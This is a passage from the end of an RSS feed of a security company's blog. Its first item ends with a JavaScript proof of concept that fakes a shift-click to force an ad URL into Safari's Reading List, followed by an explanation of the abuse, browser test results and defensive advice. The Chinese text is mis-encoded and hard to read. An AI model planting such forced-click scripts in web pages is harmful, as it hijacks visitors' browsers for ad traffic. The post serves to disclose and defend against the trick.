class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://google.com/?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Test: FORCE_ADD_URL_TO_READINGLIST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;åˆ©ç”¨ã€Œ&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&quot;&gt;initMouseEvent&lt;/a&gt;ã€æ¨¡æ“¬æ»‘é¼ çš„é»æ“Šï¼Œåœ¨ URL ä¸ŠæŒ‰ä¸‹ Shift éµé»æ“Šã€‚åœ¨ä¸€èˆ¬ç€è¦½å™¨ä¸­æ˜¯ã€Œé–‹å•Ÿæ–°è¦–çª—ã€ï¼Œåœ¨ Safari ä¸­å‰‡æ˜¯ã€ŒåŠ å…¥é–±è®€æ¸…å–®ã€äº†ï¼Œå› æ­¤å½¢æˆå»£å‘Šè¦–çª—ä¸æ–·åŠ å…¥é–±è®€æ¸…å–®çš„ç¾è±¡ã€‚å»£å‘Šå•†åˆ©ç”¨é€™ç¨®æ‰‹æ³•å¢åŠ å»£å‘Šçš„é»æ“Šç‡ï¼Œåªè¦ç€è¦½å™¨æ²’æœ‰å®‰è£é˜»æ“‹å»£å‘Šçš„å¥—ä»¶æˆ–è€…æ˜¯é˜»æ“‹ã€Œå½ˆå‡ºå¼è¦–çª—ã€ï¼Œä½ å°±æœƒæˆç‚ºæµé‡çš„è²¢ç»è€…ã€‚&lt;/p&gt;

&lt;p&gt;ç¶“éæˆ‘å€‘çš„æ¸¬è©¦ï¼ŒInternet Explorerã€Mozilla Firefox ä¸æœƒå—é€™é¡æ”»æ“Šå½±éŸ¿ï¼ŒGoogle Chromeã€Opera å‰‡æœƒè¢«å…§å»ºçš„ Pop-up è¦–çª—é˜»æ“‹åŠŸèƒ½æ“‹ä¸‹ã€‚ä½†è‹¥æ˜¯ç›´æ¥æ¨¡æ“¬é»æ“Šï¼Œå‰‡å…¨æ•¸ç€è¦½å™¨éƒ½æœƒå—å½±éŸ¿å°å‘è‡³ URLã€‚é›–ç„¶é€™ç¨®é¡å‹çš„æ”»æ“Šä¸æœƒé€ æˆå¯¦è³ªä¸Šçš„æå¤±è·Ÿå±å®³ï¼Œä½†è‹¥æ˜¯çµåˆå…¶ä»–æƒ¡æ„æ‰‹æ³•å°‡å¯ä»¥é€ æˆæ”»æ“Šã€‚ä¾‹å¦‚é€éç¶²ç«™æ›ç¢¼å°‡ä½¿ç”¨è€…å°å‘è‡³æƒ¡æ„ç¶²ç«™ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;è‹¥è¦é¿å…æ­¤é¡å‹æ”»æ“Šï¼Œæœ‰ä»¥ä¸‹å¹¾å€‹å»ºè­°æ–¹æ¡ˆï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å®‰è£ NoScript é¡å‹å¥—ä»¶ï¼Œåƒ…å…è¨±å¯ä¿¡è³´çš„ç¶²ç«™åŸ·è¡Œ JavaScript&lt;/li&gt;
  &lt;li&gt;é–‹å•Ÿã€Œå½ˆå‡ºå¼è¦–çª—ã€é˜»æ“‹åŠŸèƒ½ï¼Œä¸¦å°‡ç¶²ç«™å®‰å…¨æ€§ç­‰ç´šæé«˜ã€‚&lt;/li&gt;
  &lt;li&gt;å®‰è£ AdBlock ç­‰å»£å‘Šé˜»æ“‹å¥—ä»¶ï¼ˆä½†æœƒå½±éŸ¿ç¶²ç«™ç‡Ÿæ”¶ï¼‰&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ç€è¦½å™¨ä»¥ç­–å®‰å…¨&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç¶²é å‹çš„æ”»æ“Šè¶Šä¾†è¶Šå¤šæ¨£åŒ–ï¼Œé™¤äº†ä¾è³´ç€è¦½å™¨æœ¬èº«çš„ä¿è­·ä¸¦è¼”ä»¥ç¬¬ä¸‰æ–¹å®‰å…¨å¥—ä»¶ä¹‹å¤–ï¼Œæ›´éœ€è¦ä½¿ç”¨è€…æœ¬èº«çš„å®‰å…¨æ„è­˜ï¼Œæ‰èƒ½å®‰å¿ƒæš¢å¿«çš„ç€è¦½ç¶²è·¯ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking/</link>
                <guid>https://devco.re/blog/2014/03/06/qiyou-ads-hijacking</guid>
                <pubDate>Thu, 06 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE æ–°ç¶²ç«™ä¸Šç·šï¼</title>
                <description>&lt;p&gt;DEVCORE çš„æ–°ç¶²ç«™ä¸Šç·šäº†ï¼&lt;br /&gt;
éå¸¸æ„Ÿè¬å°ˆæ¥­çš„ &lt;a href=&quot;http://evendesign.tw/&quot;&gt;EVENDESIGN&lt;/a&gt; å¹«æˆ‘å€‘è¨­è¨ˆç²¾ç¾çš„ç¶²ç«™ï¼&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ç›®å‰ä¸»è¦æœå‹™é …ç›®ç‚ºæ»²é€æ¸¬è©¦ã€è³‡å®‰æ•™è‚²è¨“ç·´ã€è³‡å®‰äº‹ä»¶è™•ç†ã€è³‡å®‰é¡§å•æœå‹™ï¼Œ&lt;br /&gt;
å„é …æœå‹™çš„è©³ç´°å…§å®¹å¯åƒè€ƒ &lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Services&lt;/a&gt; é é¢ã€‚&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;åŒæ™‚ï¼Œåœ¨å®˜ç¶²ä¸­æˆ‘å€‘å°‡æœƒä¸å®šæœŸæä¾›æœ€æ–°çš„è³‡å®‰æ–°çŸ¥åŠæŠ€è¡“æ–‡ç« ï¼Œ&lt;br /&gt;
å¸Œæœ›è—‰ç”±æˆ‘å€‘çš„åŠ›é‡è®“å¤§çœ¾æ›´æ¸…æ¥šè³‡è¨Šå®‰å…¨çš„é‡è¦ã€‚&lt;br /&gt;
ä¸¦ä¸”é€éç«™å…§çš„æ•™å­¸æ–‡ç»ï¼Œè®“é–‹ç™¼è€…ã€ç®¡ç†è€…é€²ä¸€æ­¥äº†è§£é§­å®¢çš„æ€ç¶­ã€æ”»é˜²çš„æ‰‹æ³•ï¼Œ&lt;br /&gt;
çŸ¥å·±çŸ¥å½¼ï¼Œæ‰èƒ½ç™¾æˆ°ä¸æ€ ã€‚ç­è§£å¦‚ä½•æ”»æ“Šï¼Œæ›´èƒ½çŸ¥é“å¦‚ä½•é˜²ç¦¦ã€‚&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;è‹¥å°æˆ‘å€‘çš„ç¶²ç«™å…§å®¹æˆ–æœå‹™æœ‰ä»»ä½•å»ºè­°ï¼Œæ­¡è¿æ‚¨éš¨æ™‚èˆ‡æˆ‘å€‘è¯ç¹«ã€‚&lt;br /&gt;
å¸Œæœ›æˆ‘å€‘èƒ½ç‚ºæ‚¨çš„ä¼æ¥­è³‡è¨Šå®‰å…¨æœ€ä½³æŠŠé—œè€…ï¼&lt;br /&gt;
æ­¡è¿éš¨æ™‚è¯çµ¡æˆ‘å€‘ï¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contact [at] devco.re&lt;/code&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/02/27/devcore-new-website/</link>
                <guid>https://devco.re/blog/2014/02/27/devcore-new-website</guid>
                <pubDate>Thu, 27 Feb 2014 00:00:00 +0800</pubDate>
        </item>


</channel>
</rss>
